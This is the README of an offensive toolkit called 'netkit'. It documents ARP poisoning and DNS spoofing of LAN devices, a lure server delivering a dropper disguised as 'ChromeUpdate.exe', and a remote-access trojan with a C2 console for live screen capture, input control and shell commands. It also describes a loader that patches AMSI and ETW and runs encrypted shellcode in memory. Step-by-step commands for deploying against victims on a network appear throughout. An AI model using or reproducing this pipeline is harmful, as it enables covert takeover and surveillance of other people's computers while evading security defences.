# netkit

LAN device watcher + captive-portal delivery pipeline + remote screen controller.
Operator-side tooling: a Python stack for network mapping and device discovery, a
lure/dropper HTTP server, a multi-session C2 console for live screen view and input
control, and an optional native C++ payload with an in-memory shellcode loader chain.

## Components

| Path | Role |
|---|---|
| `watch.py` | Polls the ARP table; flags devices joining/leaving the LAN; optional hook command per new device |
| `redirect.py` | ARP poison both directions + DNS spoof (scapy); steers victim DNS queries to the payload server |
| `dns_sink.py` | Minimal DNS responder; answers every A/ANY query with one IP (router DNS-override mode) |
| `payload_server.py` | Serves a captive-portal style lure page + dropper download on any HTTP request (port 80) |
| `c2_server.py` | Multi-session console: live screen view, mouse/keyboard forwarding, shell command bar |
| `rat_client.py` | Python payload variant (LAN testing); same wire protocol as the C++ payload |
| `evasion/` | Native C++ payload + Donut shellcode loader chain (AMSI/ETW patch, AES-256-CBC staged) |

## Wire protocol

Shared by both payloads. Header: `struct "<IB"` = uint32 LE length + uint8 type.

| Type | Value | Payload |
|---|---|---|
| MSG_HELLO | 0 | JSON `{host,user,os,ip}` |
| MSG_FRAME | 1 | JPEG bytes |
| MSG_INPUT | 2 | JSON `{t:"m"/"c"/"s"/"k", ...}` |
| MSG_CMD | 3 | command string |
| MSG_CMD_OUT | 4 | JSON `{out}` |

Input coordinates are normalized 0..1 (server maps from canvas, client maps to
screen dimensions).

## Requirements

- Windows 10/11, Python 3.10+
- Dependencies: `py -m pip install -r requirements.txt` (`mss`, `numpy`, `pillow`, `pynput`, `scapy`)
- `redirect.py` needs an admin shell and **Npcap** installed (scapy L2 access)
- `payload_server.py` on port 80 needs an admin shell
- Evasion chain: MSVC 2022 (Desktop C++ workload), CMake, [Donut](https://github.com/TheWover/donut), Python `cryptography`
- Note: if `python` resolves to the Windows Store stub, use `py` instead

## Quick start (loopback test)

```powershell
py -m pip install -r requirements.txt

# terminal 1
py c2_server.py --port 4444

# terminal 2
py rat_client.py --c2 127.0.0.1:4444
```

A session should appear in the console with a live screen feed.

## Deployment pipeline

```powershell
# 1. build the dropper payload
pyinstaller -F -w --name ChromeUpdate rat_client.py

# 2. start the console
py c2_server.py --port 4444

# 3. serve the lure (admin shell, port 80)
py payload_server.py --file dist\ChromeUpdate.exe --name Update.exe --port 80

# 4a. delivery via ARP redirect (admin shell + Npcap)
py redirect.py --target 192.168.1.42 --gateway 192.168.1.1 --forward

# 4b. or delivery via router DNS override — set the DHCP "Primary DNS" to this box,
#     then run the sink; every client A record resolves to the payload server
py dns_sink.py --ip 192.168.1.50

# 5. watch for new devices and auto-redirect them
py watch.py --interval 5 --sweep 192.168.1.0/24 --on-new "py redirect.py --target {ip} --forward"
```

Teardown: `Ctrl+C` on `redirect.py` restores the poisoned ARP entries; stop the
router DNS override (or stop `dns_sink.py`) and the DNS path is dead.

## CLI reference

**watch.py**
- `--interval N` — seconds between ARP polls
- `--sweep CIDR` — active ARP scan of the subnet (scapy, optional)
- `--on-new "cmd {ip} {mac}"` — hook fired per newly seen device

**redirect.py**
- `--target IP` — victim
- `--gateway IP` — router
- `--iface NAME` — interface override
- `--forward` — enable IP forwarding (`IPEnableRouter=1` + `RemoteAccess` service)

**payload_server.py**
- `--file PATH` — payload to serve
- `--name NAME` — filename presented to the client
- `--port N` — listen port (80 default; admin required below 1024)

**dns_sink.py**
- `--ip IP` — address all A/ANY answers resolve to
- `--port N` — listen port (53 default)

**rat_client.py**
- `--c2 host:port` — console endpoint (default `192.168.1.10:4444`)
- `--quality N` — JPEG quality (60 default)
- `--scale F` — frame scale factor (0.75 default)
- `--fps N` — capture rate (15 default)
- `--no-shell` — disable the shell command handler

## Evasion chain (`evasion/`)

```powershell
cd evasion
.\build.ps1 -C2 192.168.1.10:4444 -Donut C:\tools\donut\donut.exe
# output: build\Release\Update.exe
```

The chain: `rat_client.exe` (native payload, GDI capture + WIC JPEG + `SendInput`)
is converted to Donut shellcode, AES-256-CBC encrypted with a fresh key/IV per
build (`builder.py`), and wrapped by `loader.cpp` — a loader that patches
`AmsiScanBuffer` and `EtwEventWrite`, decrypts the stage in memory (bcrypt CNG),
and transfers execution via an RX `VirtualProtect` page. No stage is written to
disk. **Rebuild per deployment** — the loader key is regenerated each run.

## Operational notes

- `pynput` cannot inject input into elevated windows; the capture side is unaffected
- `mss`/`pynput` are desktop-oriented — the Python payload is Windows/Linux/macOS desktop only
- No persistence is included: the payload runs for the lifetime of the process only
- Frame budget: `--quality/--scale/--fps` trade bandwidth against smoothness; 60/0.75/15 is ~1.5-3 Mbps
- Windows Firewall: allow inbound 4444/tcp (console) and 80/tcp (lure) on the private profile
- Chrome/Firefox "Secure DNS" (DoH) bypasses router-level DNS interception — those clients keep resolving independently
